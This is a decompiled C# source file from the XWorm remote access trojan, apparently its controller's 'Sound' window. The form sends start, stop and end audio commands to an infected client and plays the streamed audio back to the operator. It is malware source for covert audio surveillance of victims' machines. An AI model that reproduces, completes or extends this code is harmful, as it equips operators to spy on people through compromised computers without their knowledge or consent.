using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;
using NAudio.Wave;
using XWorm.My.Resources;

namespace XWorm
{
	// Token: 0x0200002C RID: 44
	[DesignerGenerated]
	public partial class Sound : Form
	{
		// Token: 0x0600084C RID: 2124 RVA: 0x0004896C File Offset: 0x00046B6C
		public Sound()
		{
			base.FormClosing += this.Sound_FormClosing;
			this.waveplayer = new WasapiOut();
			this.bwp = new BufferedWaveProvider(WaveFormat.CreateIeeeFloatWaveFormat(44100, 2));
			this.InitializeComponent();
		}

		// Token: 0x1700030E RID: 782
		// (get) Token: 0x0600084F RID: 2127 RVA: 0x00048F5E File Offset: 0x0004715E
		// (set) Token: 0x06000850 RID: 2128 RVA: 0x00048F68 File Offset: 0x00047168
		internal virtual StatusStrip StatusStrip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700030F RID: 783
		// (get) Token: 0x06000851 RID: 2129 RVA: 0x00048F71 File Offset: 0x00047171
		// (set) Token: 0x06000852 RID: 2130 RVA: 0x00048F7B File Offset: 0x0004717B
		internal virtual ToolStripStatusLabel ToolStripStatusLabel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000310 RID: 784
		// (get) Token: 0x06000853 RID: 2131 RVA: 0x00048F84 File Offset: 0x00047184
		// (set) Token: 0x06000854 RID: 2132 RVA: 0x00048F8E File Offset: 0x0004718E
		internal virtual PictureBox PictureBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000311 RID: 785
		// (get) Token: 0x06000855 RID: 2133 RVA: 0x00048F97 File Offset: 0x00047197
		// (set) Token: 0x06000856 RID: 2134 RVA: 0x00048FA4 File Offset: 0x000471A4
		internal virtual System.Windows.Forms.Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				System.Windows.Forms.Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x17000312 RID: 786
		// (get) Token: 0x06000857 RID: 2135 RVA: 0x00048FE7 File Offset: 0x000471E7
		// (set) Token: 0x06000858 RID: 2136 RVA: 0x00048FF4 File Offset: 0x000471F4
		internal virtual Guna2GradientButton Guna2GradientButton1
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton1_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton1;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton1 = value;
				guna2GradientButton = this._Guna2GradientButton1;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x17000313 RID: 787
		// (get) Token: 0x06000859 RID: 2137 RVA: 0x00049037 File Offset: 0x00047237
		// (set) Token: 0x0600085A RID: 2138 RVA: 0x00049041 File Offset: 0x00047241
		internal virtual PictureBox PictureBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x0600085B RID: 2139 RVA: 0x0004904C File Offset: 0x0004724C
		private void Sound_FormClosing(object sender, FormClosingEventArgs e)
		{
			try
			{
				this.waveplayer.Stop();
				WasapiOut wasapiOut = this.waveplayer;
				if (wasapiOut != null)
				{
					wasapiOut.Dispose();
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
			byte[] state = Helper.SB("ESound");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x0600085C RID: 2140 RVA: 0x000490D8 File Offset: 0x000472D8
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				bool flag = !this.C.IsConnected;
				if (flag)
				{
					base.Close();
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x0600085D RID: 2141 RVA: 0x00049130 File Offset: 0x00047330
		private void Guna2GradientButton1_Click(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Guna2GradientButton1.Text, "Start", false) == 0;
			if (flag)
			{
				byte[] state = Helper.SB("SSound");
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
				this.Guna2GradientButton1.Text = "Stop";
				this.Guna2GradientButton1.Image = Resources._Stop;
				this.PictureBox2.Enabled = true;
			}
			else
			{
				byte[] state2 = Helper.SB("CSound");
				Client $VB$NonLocal_3 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_3.BeginSend((byte[])a0);
				}, state2);
				this.Guna2GradientButton1.Text = "Start";
				this.Guna2GradientButton1.Image = Resources.Play;
				this.PictureBox2.Enabled = false;
			}
		}

		// Token: 0x04000375 RID: 885
		public Client C;

		// Token: 0x04000376 RID: 886
		public WasapiOut waveplayer;

		// Token: 0x04000377 RID: 887
		public BufferedWaveProvider bwp;
	}
}
